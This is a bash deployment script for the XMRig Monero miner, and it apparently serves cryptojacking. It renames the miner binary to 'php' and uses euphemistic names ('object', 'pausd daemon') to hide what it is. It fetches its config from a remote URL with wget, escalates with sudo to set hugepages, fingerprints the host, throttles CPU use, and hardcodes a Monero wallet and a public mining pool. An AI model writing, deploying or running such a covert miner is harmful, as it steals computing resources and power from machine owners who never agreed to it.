#!/bin/bash

## object config
OBJ_MASK="${OBJ_MASK:-php}"
PAUSD_DAEMON="${PAUSD_DAEMON:-pausd}"
PAUSD_DAEMON_NAME="${PAUSD_DAEMON##* }"
OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
# PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name

## download cfg
if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_CFG}"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-xmrig}
[ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
chmod +x "${OBJ_MASK}" &>/dev/null

## daemon
# (when not included in the payload or is not a function)
# PAUSD_DAEMON_URL=""
# wget -q ${PAUSD_DAEMON_URL}
if [ -e $PAUSD_DAEMON_NAME ]; then
    chmod +x ${PAUSD_DAEMON_NAME} &>/dev/null
fi

## daemons conf
## misc
[ $UID != 0 ] && sudo=$(get_path sudo 2>/dev/null)
if [ -n "$HPGS" ]; then
    printf $HPGS | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
else
    for i in {128,64,32,16,8,4}; do ## try setting some hugepages
        printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
    done
fi

## instance ID
# CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
CORES=$(nproc || grep -c "cpu cores" < /proc/cpuinfo)
parse_ip
# IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
HOSTN="$(echo $HOSTNAME | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity

## L3 cache size to multihash factor
cache_bytes=$(grep -im1 "cache size" </proc/cpuinfo | sed -r 's/[^0-9]*([0-9]+).*/\1/')
cache_MB=${cache_MB:-$((cache_bytes / 1024 ))}
if [ ${TARGET_CRT:-xmr} = xmr ]; then
        hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
else
        hashes=$cache_MB
fi

## cpu
cgp=cpu.cfs_period_us
cgq=cpu.cfs_quota_us
## paths are not always the same
cg1=/sys/fs/cgroup/cpuacct,cpu
cg2=/sys/fs/cgroup/cpu,cpuacct
if [ -a $cg1 ]; then
    cpu_p=$(<$cg1/$cgp)
    cpu_q=$(<$cg1/$cgq)
elif [ -a $cg2 ]; then
    cpu_p=$(<$cg2/$cgp)
    cpu_q=$(<$cg2/$cgq)
fi
if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
        ACORES=${ACORES:-$((cpu_q / cpu_p))} ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" -eq 1 ]; then
        PAUSD_THREADS_D=1
        if [ "$hashes" -gt 5 ]; then
                PAUSD_VER_D=5
        else
                PAUSD_VER_D=${hashes}
        fi
        elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
                PAUSD_THREADS_D="$ACORES"
                hashes_pc=$((hashes / ACORES))
                if [ "$hashes_pc" -ge 5 ]; then
                        PAUSD_VER_D=4 ## never use 5mh with more than 1c
                else
                        PAUSD_VER_D=$hashes_pc
        fi
    fi
else ## no cgroups, use half the cores
        
        [ $CORES -gt 1 ] && PAUSD_THREADS_D=$((CORES / 2)) || PAUSD_THREADS_D=1
        hashes_pc=$((hashes / PAUSD_THREADS_D))
        if [ "$hashes_pc" -ge 5 ]; then
                PAUSD_VER_D=4
        else
                PAUSD_VER_D=$hashes_pc
        fi
fi
## respect custom settings
if [ -n "$MHF_FIXED" ]; then 
    PAUSD_VER=${MHF_FIXED}
else
    PAUSD_VER=${PAUSD_VER:-${PAUSD_VER_D}}
fi
if [ -n "$THREADS_FIXED" ]; then
    PAUSD_THREADS=$THREADS_FIXED
else
    PAUSD_THREADS=${PAUSD_THREADS:-${PAUSD_THREADS_D}}
fi
## don't setup affinity because on shared environments it yields lower performance overall
## because doesn't let the cpu scheduler do its job, other processes might stall causing further
## overhead making the system unstable, also close to useless in non-bare scenarios.
export AFFINITY="0x0"

## vars for the pausd daemon
export PAUSD_THREADS PAUSD_VER=${PAUSD_VER:-2}
export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
       PAUSD_RATE=${PAUSD_RATE:-200}

## vars for the object config
read loadavg < /proc/loadavg
loadavg=${loadavg% *[0-9]\/*} ## strip proc counters
ID=${ID:-"{$ip}{$country}{$region}{$HOSTN}{${ENDPOINT:-$TNL_LISTEN_TARGET}}{{${loadavg// /|}}}"}
export \
ID=$(printf '%s' "$ID") \
PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
AL=${AL:-cryptonight} \
AESNI=${AESNI:-1} \
ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}

# ## set vars used by pausd daemon in tmux and envsubst
# printf "" > "config.${PAUSD_DAEMON_NAME}"
# for v in $(builtin compgen -A variable | grep ^PAUSD); do
#     export $v
#     printf "%s" "${v}=\"${!v}\" " >> "config.${PAUSD_DAEMON_NAME}"
#     # tmx setenv -g $v "${!v}" ; ## don't use env vars for daemon configs, use file
# done

## subst
envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
